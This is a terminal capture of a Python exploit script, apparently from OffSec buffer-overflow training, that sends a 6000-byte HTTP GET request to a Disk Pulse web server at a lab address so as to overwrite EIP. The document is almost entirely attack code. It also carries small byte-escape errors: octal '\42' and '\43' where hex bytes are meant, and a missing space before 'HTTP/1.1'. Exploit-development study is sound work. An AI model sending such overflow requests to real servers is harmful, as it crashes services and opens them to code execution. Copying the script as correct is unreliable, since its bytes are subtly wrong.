

```
┌──(root㉿BHASHMA)-[~/OFFSEC_/SEH_EXTRA_MILE/DISK_PULSE]
└─# cat control_eip.py 
#!/usr/bin/python
import socket, sys

host = "192.168.147.10"
port = 80
crash = 6000
offset = 2499


def send_exploit_request():

    buffer  = b"\x41" * offset
    buffer += b"\42\x42\x42\x42"
    buffer += b"\43" * (crash -len(buffer))
    
    print(f"[+] Sending {len(buffer)} bytes.....")

    #HTTP Request
    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
    request += b"Host: " + host.encode() + b"\r\n"
    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
    request += b"Connection: keep-alive" + b"\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()
    
    print("HACK THE PLANET")

if __name__ == "__main__": 
    send_exploit_request()
```